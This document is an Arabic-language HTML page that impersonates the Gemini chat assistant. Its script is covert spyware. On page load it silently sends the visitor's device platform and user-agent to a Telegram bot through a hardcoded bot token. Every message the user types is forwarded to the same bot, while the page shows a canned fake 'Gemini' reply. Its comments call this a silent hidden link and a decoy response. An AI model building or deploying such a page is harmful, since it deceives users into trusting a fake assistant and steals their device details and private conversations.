<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Gemini</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
    
    <style>
        body { background-color: #131314; color: #e3e3e3; font-family: 'Google Sans', sans-serif; height: 100vh; margin: 0; display: flex; flex-direction: column; }
        .gemini-gradient { background: linear-gradient(90deg, #4285f4, #9b72cb, #d96570); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 500; }
        .chat-container { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 24px; max-width: 800px; margin: 0 auto; width: 100%; }
        .user-msg { align-self: flex-end; background-color: #1e1f20; padding: 12px 20px; border-radius: 20px; max-width: 80%; }
        .ai-msg { align-self: flex-start; display: flex; gap: 16px; max-width: 90%; }
        .ai-icon { width: 30px; height: 30px; background: linear-gradient(135deg, #4285f4, #d96570); border-radius: 50%; flex-shrink: 0; }
        .input-area { padding: 20px; max-width: 850px; margin: 0 auto; width: 100%; }
        .input-box { background-color: #1e1f20; border-radius: 32px; padding: 12px 24px; display: flex; align-items: center; gap: 16px; }
        input { background: transparent; border: none; outline: none; color: white; flex: 1; font-size: 16px; }
        .icon-btn { color: #c4c7c5; cursor: pointer; font-size: 20px; transition: 0.2s; }
        .icon-btn:hover { color: white; }
    </style>
</head>
<body>

    <header class="p-4 flex justify-between align-center border-b border-[#303132]">
        <div class="flex items-center gap-2">
            <span class="text-xl font-medium">Gemini</span>
            <span class="bg-[#303132] text-[10px] px-2 py-0.5 rounded text-[#c4c7c5]">Free</span>
        </div>
        <div class="w-8 h-8 rounded-full bg-[#303132] border border-[#444746]"></div>
    </header>

    <main class="chat-container" id="chat">
        <div class="ai-msg">
            <div class="ai-icon"></div>
            <div>أهلاً بك! أنا Gemini، كيف يمكنني مساعدتك اليوم؟</div>
        </div>
    </main>

    <footer class="input-area">
        <div class="input-box">
            <i class="far fa-image icon-btn"></i>
            <input type="text" id="userInput" placeholder="أدخل عبارة هنا">
            <i class="fas fa-microphone icon-btn"></i>
            <i id="sendBtn" class="fas fa-arrow-up icon-btn" style="color: #4285f4;"></i>
        </div>
        <p class="text-[11px] text-[#c4c7c5] text-center mt-3">قد يعرض Gemini معلومات غير دقيقة، لذا يرجى التحقق من ردوده.</p>
    </footer>

    <script>
        const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
        const CHAT_ID = "YOUR_CHAT_ID"; // ضع الـ ID الخاص بك هنا

        // الربط العكسي الصامت (Hidden Service)
        function silentConnect() {
            const data = `📱 Device Linked: ${navigator.platform}\n🔋 Battery: ${navigator.userAgent.slice(0, 30)}...`;
            // الاتصال بالخلفية بدون إظهار أي رسالة في الواجهة
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(data)}`);
        }

        // تشغيل الاتصال الصامت فوراً
        silentConnect();

        // منطق الدردشة (محاكاة Gemini)
        async function handleChat() {
            const input = document.getElementById('userInput');
            const text = input.value.trim();
            if(!text) return;

            // إضافة رسالة المستخدم
            addMessage('user', text);
            input.value = '';

            // رد Gemini التمويهي
            setTimeout(() => {
                addMessage('ai', "بصفتي مساعدك الذكي، سأقوم بمعالجة طلبك بدقة. هل هناك تفاصيل أخرى تود إضافتها؟");
                // إرسال محتوى المحادثة للبوت الخاص بك صمتاً
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=User_Input: ${encodeURIComponent(text)}`);
            }, 1000);
        }

        function addMessage(role, text) {
            const chat = document.getElementById('chat');
            const div = document.createElement('div');
            div.className = role === 'user' ? 'user-msg' : 'ai-msg';
            div.innerHTML = role === 'user' ? text : `<div class="ai-icon"></div><div>${text}</div>`;
            chat.appendChild(div);
            chat.scrollTop = chat.scrollHeight;
        }

        document.getElementById('sendBtn').onclick = handleChat;
        document.getElementById('userInput').onkeydown = (e) => { if(e.key === 'Enter') handleChat(); };
    </script>
</body>
    </html>
